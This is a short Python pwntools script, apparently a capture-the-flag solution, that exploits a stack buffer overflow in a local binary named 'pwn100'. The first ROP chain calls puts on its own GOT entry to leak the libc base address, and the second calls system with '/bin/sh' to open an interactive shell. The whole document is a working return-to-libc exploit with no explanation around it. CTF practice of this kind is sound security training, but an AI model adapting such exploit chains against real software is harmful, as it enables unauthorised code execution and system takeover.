from pwn import *

pop_rdi = 0x400763
puts_got = 0x601018
puts_plt = 0x400500 
start = 0x40068e
binsh = 0x1b3e9a
ret = 0x4004e1

r = process('./pwn100')
e = ELF('./libc.so.6')
pause()

# Leak libc base
r.send(b'a' * 72 + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(start) + b'b' * (200-72-32))
r.recvline()
libc = u64(r.recv(6) + b'\0\0') - 0x809c0
success('libc base => %s' % hex(libc))
r.send(b'a' * 72 + p64(ret) + p64(pop_rdi) + p64(binsh+libc) + p64(e.symbols.system+libc) + b'b' * (200-72-32))
r.interactive()
